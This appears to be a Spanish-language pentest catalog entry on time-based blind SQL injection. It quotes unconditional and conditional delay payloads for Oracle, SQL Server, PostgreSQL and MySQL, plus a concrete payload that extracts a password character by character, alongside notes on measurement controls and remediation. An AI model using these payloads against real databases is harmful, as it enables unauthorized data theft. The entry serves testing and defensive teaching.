---
clase: inyeccion
tech: sql-multi-dbms
cwe: CWE-89
cvss: 7.5 # [derivado] extraccion bit a bit cuando no hay ningun otro canal
payload: |
  # RETARDOS NO CONDICIONALES (10 segundos) - LITERALES de la fuente:
  #
  # Oracle:
  dbms_pipe.receive_message(('a'),10)
  # Microsoft:
  WAITFOR DELAY '0:0:10'
  # PostgreSQL:
  SELECT pg_sleep(10)
  # MySQL:
  SELECT SLEEP(10)
  #
  # RETARDOS CONDICIONALES - LITERALES de la fuente.
  # 'YOUR-CONDITION-HERE' es marcador DE LA FUENTE.
  #
  # Oracle:
  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
  # Microsoft:
  IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
  # PostgreSQL:
  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
  # MySQL:
  SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
  #
  # Notese el detalle de PostgreSQL: la rama falsa usa pg_sleep(0), no NULL. Mantiene
  # la misma FORMA de consulta en ambas ramas y evita diferencias de tipo.
  #
  # INSTANCIACION concreta (MySQL), primer caracter de una password:
  SELECT IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(10),'a')
precondicion: "Inyeccion SQL confirmada SIN ningun canal observable: ni datos en la respuesta, ni mensajes de error, ni diferencia entre error y exito. Lo unico que queda es el TIEMPO de respuesta. Hace falta que la consulta inyectada se ejecute de forma sincrona respecto a la respuesta HTTP."
como_se_descubre: |
  Es el ultimo recurso del arbol, cuando las tres tecnicas anteriores (mensajes de
  error, union, errores condicionales) han fallado.
  Sonda inicial: inyectar el retardo NO condicional y medir. Si la respuesta tarda
  ~10s mas que la linea base, el canal existe. Esto hay que hacerlo antes de cualquier
  retardo condicional: confirma a la vez que la inyeccion ejecuta y que el tiempo es
  observable.
  Es la tecnica mas lenta y la mas ruidosa: cada bit cuesta segundos y deja peticiones
  largas en los registros del objetivo. Conviene reservarla y, cuando se use,
  minimizar el numero de bits (extraer longitudes antes que contenidos).
control_negativo: |
  # Control de LINEA BASE, imprescindible:
  # A: peticion con el retardo no condicional -> tiempo base + ~10s
  # B: peticion identica sin inyeccion        -> tiempo base
  # C: [derivado] repetir B varias veces para medir la VARIANZA de la red
  # El control C es el que suele faltar y el que invalida los resultados: si la
  # varianza normal del objetivo es de varios segundos, un retardo de 10s no es
  # distinguible con una sola medicion y hacen falta repeticiones o retardos mayores.
  # Interpretar jitter como señal produce extracciones enteras de datos inventados.
mata: |
  - La consulta inyectada se ejecuta de forma asincrona -> el tiempo de respuesta HTTP
    no refleja el retardo.
  - Timeouts del servidor o del proxy por debajo del retardo elegido -> usar valores menores.
  - Varianza de red del orden del retardo (ver control C) -> sin señal fiable.
  - Oracle: dbms_pipe.receive_message requiere privilegios de ejecucion sobre el paquete.
  - Limitacion de peticiones que haga inviable el numero de bits necesario.
fuente: "https://portswigger.net/web-security/sql-injection/cheat-sheet (secciones 'Time delays' y 'Conditional time delays'). Payloads literales de la pagina, incluido el marcador 'YOUR-CONDITION-HERE'."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] Retardos temporales condicionales — el último canal cuando no queda ninguno

## Principio
Si la aplicación no devuelve datos, ni errores, ni distingue error de éxito, queda una
propiedad observable: **cuánto tarda**. Un retardo condicional convierte un booleano en
latencia. Es el canal más pobre del árbol —un bit por petición, y cada petición cuesta
segundos— pero existe cuando no existe ningún otro.

## Payload
Retardos no condicionales, de 10 segundos:

```sql
-- Oracle
dbms_pipe.receive_message(('a'),10)
-- Microsoft
WAITFOR DELAY '0:0:10'
-- PostgreSQL
SELECT pg_sleep(10)
-- MySQL
SELECT SLEEP(10)
```

Condicionales:

```sql
-- Oracle
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
-- Microsoft
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
-- PostgreSQL
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
-- MySQL
SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
```

Instanciado, para el primer carácter de una contraseña en MySQL:

```sql
SELECT IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(10),'a')
```

## Un detalle de diseño en la variante de PostgreSQL
La rama falsa usa `pg_sleep(0)`, no `NULL`. Mantiene la misma forma y el mismo tipo de
retorno en ambas ramas, lo que evita que la diferencia entre verdadero y falso se
manifieste por otra vía (un error de tipo) en lugar de por el tiempo. Es el tipo de
cuidado que distingue un payload de catálogo de uno improvisado.

## El control que casi siempre falta
Medir la **varianza normal** del objetivo repitiendo la petición sin inyección. Si la
latencia del objetivo oscila varios segundos por su cuenta, un retardo de 10 segundos no
es distinguible con una sola medición. Interpretar jitter como señal no produce un
resultado dudoso: produce una extracción completa de datos inventados, internamente
coherente y totalmente falsa. Es el fallo más peligroso de esta técnica precisamente
porque el resultado *parece* bien.

## Coste y ruido
Es la técnica más lenta y la más visible en los registros del objetivo: deja un rastro de
peticiones de duración anómala. Conviene reservarla para cuando el resto del árbol ha
fallado y, al usarla, reducir el número de bits — extraer primero longitudes y rangos,
y solo después contenidos.

## Remediación
Consultas parametrizadas. `# [derivado]`: a diferencia de los otros canales, este no se
puede cerrar ocultando información, porque el tiempo de ejecución no se puede
"no mostrar". Sí ayudan los timeouts de consulta del lado del servidor, que acotan cuánto
puede durar una consulta inyectada y degradan la fiabilidad del canal.
